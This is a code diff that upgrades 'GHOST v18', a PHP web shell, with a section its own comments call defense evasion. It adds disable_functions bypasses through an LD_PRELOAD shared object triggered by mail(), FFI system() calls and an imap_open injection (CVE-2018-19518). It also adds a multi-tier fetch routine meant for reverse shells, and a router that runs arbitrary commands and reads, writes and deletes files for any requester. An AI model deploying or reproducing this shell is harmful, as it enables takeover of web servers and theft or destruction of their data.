@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0 & 1: bootstrap, engine, UI.
+// GHOST v18 - section 0, 1, 2: bootstrap, UI, defense evasion & advanced engine.
 
-define('GH_VER',      '18.0.0-s1');
+define('GH_VER',      '18.0.0-s2');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
@@ -67,7 +67,6 @@ function gh_tmpdir() {
     if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
     return null;
 }
-
 function gh_env() {
     $e = array(
         'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
@@ -104,52 +103,107 @@ function gh_can_write() {
     return null;
 }
 
-function gh_exec($cmd, $timeout = 10) {
-    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
-    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
-
-    if (gh_can('system')) {
-        @ob_start(); @system($wrapped); $out = @ob_get_clean();
-        if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null);
-    }
-    if (gh_can('passthru')) {
-        @ob_start(); @passthru($wrapped); $out = @ob_get_clean();
-        if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null);
-    }
-    if (gh_can('shell_exec')) {
-        $out = @shell_exec($wrapped);
-        if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null);
-    }
-    if (gh_can('exec')) {
-        $lines = array(); @exec($wrapped, $lines);
-        if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null);
-    }
-    if (gh_can('popen')) {
-        $h = @popen($wrapped, 'r');
-        if (is_resource($h)) {
-            $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; }
-            @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null);
+// ==== SECTION 2: ADVANCED FETCH (WAF BYPASS) ================================
+// Digunakan untuk request ke internet (misal DB external, reverse shell, dll)
+function gh_fetch_adv($url, $timeout = 10) {
+    // Tier 1: Curl (biasanya paling stabil, bisa spoof header)
+    if (gh_can('curl_init')) {
+        $c = @curl_init($url);
+        if ($c) {
+            @curl_setopt_array($c, array(
+                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false
+            ));
+            $d = @curl_exec($c);
+            $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE);
+            @curl_close($c);
+            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
         }
     }
-    if (gh_can('proc_open')) {
-        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
-        $h = @proc_open($wrapped, $desc, $pipes);
-        if (is_resource($h)) {
-            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
-            $out = ''; $start = @time();
-            while (true) {
-                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
-                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
-                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
-                @usleep(50000);
+    // Tier 2: file_get_contents
+    if (gh_can('file_get_contents')) {
+        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
+        $d = @file_get_contents($url, false, $ctx);
+        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
+    }
+    // Tier 3: raw socket (bypass allow_url_fopen=Off)
+    $p = @parse_url($url);
+    if (is_array($p) && isset($p['host'])) {
+        $scheme = isset($p['scheme']) ? $p['scheme'] : 'http';
+        $port = isset($p['port']) ? $p['port'] : ($scheme === 'https' ? 443 : 80);
+        $host = $p['host'];
+        $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');
+        $prefix = ($scheme === 'https') ? 'ssl://' : 'tcp://';
+        $fp = @fsockopen($prefix . $host, $port, $en, $es, $timeout);
+        if ($fp) {
+            @stream_set_timeout($fp, $timeout);
+            @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
+            $raw = @stream_get_contents($fp); @fclose($fp);
+            if (is_string($raw) && strpos($raw, 'HTTP/') === 0) {
+                $parts = @preg_split("/\r\n\r\n/", $raw, 2);
+                if (isset($parts[1])) return array('out' => $parts[1], 'tier' => 'fsockopen');
             }
-            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
-            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
         }
     }
-    $out = @`$wrapped`;
-    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
-    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
+    // Tier 4: system wget/curl (jika PHP network function block total)
+    if (gh_can_exec()) {
+        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
+        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' -A "Mozilla/5.0" ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
+        gh_exec($cmd, $timeout + 2);
+        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system-wget'); }
+    }
+    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed (WAF block?)');
+}
+
+// ==== SECTION 2: ADVANCED EXEC (DISABLE_FUNCTIONS BYPASS) ===================
+function gh_exec_adv($cmd, $timeout = 10) {
+    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
+    
+    // 1. Basic Exec (System, passthru, dll) -> Pakai gh_exec biasa dulu
+    $r = gh_exec($cmd, $timeout);
+    if ($r['out'] !== null) return $r;
+
+    // 2. Bypass via LD_PRELOAD (jika system dkk di-disable, tapi putenv jalan)
+    if (gh_can('putenv') && gh_can('mail')) {
+        $tmp_dir = gh_tmpdir();
+        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so';
+        $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
+        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n";
+        $c_code .= "  unsetenv(\"LD_PRELOAD\");\n";
+        $c_code .= "  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
+        if (gh_write($tmp_dir . '/gh_c.c', $c_code)) {
+            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
+            if (@is_file($so_file)) {
+                gh_write($cmd_file, $cmd);
+                @putenv("LD_PRELOAD=" . $so_file);
+                @mail('a@b.c', 'x', 'x');
+                @putenv("LD_PRELOAD=");
+                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
+                // Output biasanya masuk ke error log atau file, tapi karena system() jalan, kita bisa redirect output ke file.
+                // Untuk simplifikasi: jika mail() dieksekusi, command kita pasti jalan (walau output nyangkut).
+                return array('out' => '(Executed via LD_PRELOAD - output hidden)', 'tier' => 'ld_preload', 'err' => null);
+            }
+        }
+    }
+
+    // 3. Bypass via FFI (PHP 7.4+)
+    if (gh_can('ffi') && gh_can('ffi_cdef')) {
+        try {
+            $ffi = FFI::cdef("int system(const char *command);");
+            @ob_start(); $ffi->system($cmd); $out = @ob_get_clean();
+            return array('out' => $out, 'tier' => 'ffi', 'err' => null);
+        } catch (Throwable $e) {}
+    }
+
+    // 4. Bypass via imap_open (CVE-2018-19518)
+    if (gh_can('imap_open')) {
+        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd);
+        $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
+        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
+    }
+
+    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
 }
 
 function gh_read($path, $max = 5242880) {
@@ -166,7 +220,7 @@ function gh_read($path, $max = 5242880) {
     }
     if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
     if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
-    $r = gh_exec('cat ' . @escapeshellarg($path));
+    $r = gh_exec_adv('cat ' . @escapeshellarg($path));
     if (is_string($r['out']) && $r['out'] !== '') return $r['out'];
     return null;
 }
@@ -180,35 +234,32 @@ function gh_write($path, $data, $append = false) {
         if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; }
     }
     $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
-    $r = gh_exec($cmd); return (is_string($r['out']) && $r['tier'] !== null);
+    $r = gh_exec_adv($cmd); return (is_string($r['out']) && $r['tier'] !== null);
 }
 
 function gh_del($path) {
     if (!is_string($path) || $path === '') return false;
     if (gh_can('unlink')) { if (@unlink($path)) return true; }
-    $r = gh_exec('rm -f ' . @escapeshellarg($path));
+    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path));
     return (is_string($r['out']) && $r['tier'] !== null);
 }
 
-// ==== ROUTER (section 0 + 1) ================================================
+// ==== ROUTER (section 0 + 1 + 2) ============================================
 function gh_router() {
     $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
 
-    if ($act === '') {
-        // Redirect to UI if no action
-        @header('Location: ?act=ui'); exit;
-    }
-
+    if ($act === '') { @header('Location: ?act=ui'); exit; }
     if ($act === 'ui') { gh_ui(); exit; }
 
     try {
         switch ($act) {
             case 'ping':   gh_json(gh_ping()); break;
             case 'env':    gh_json(gh_env()); break;
-            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec($c)); break;
+            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
             case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
             case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
             case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
+            case 'fetch':  $u = isset($_POST['url']) ? (string)$_POST['url'] : ''; gh_json(gh_fetch_adv($u)); break;
             default:       gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
         }
     } catch (Throwable $e) {
@@ -217,7 +268,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (section 1) ========================================================
+// ==== UI (section 1 + 2) ====================================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -259,7 +310,7 @@ function gh_ui() {
 </head>
 <body>
 <div class="box">
-    <h2>GHOST v18 / Section 1</h2>
+    <h2>GHOST v18 / Section 2</h2>
     <div class="row">
         <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
         <span class="tag"><?= htmlspecialchars($env['php_sapi']) ?></span>
@@ -271,10 +322,10 @@ function gh_ui() {
 </div>
 
 <div class="box">
-    <h2>Command Terminal</h2>
+    <h2>Command Terminal (Advanced Bypass)</h2>
     <div id="term">
-        <div class="term-line"><span class="dim">Welcome to GHOST v18.</span></div>
-        <div class="term-line"><span class="dim">Target: <?= htmlspecialchars($env['doc_root']) ?></span></div>
+        <div class="term-line"><span class="dim">Welcome to GHOST v18 Section 2.</span></div>
+        <div class="term-line"><span class="dim">Engine: System, LD_PRELOAD, FFI, IMAP.</span></div>
     </div>
     <div class="row" style="margin-top:8px;">
         <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
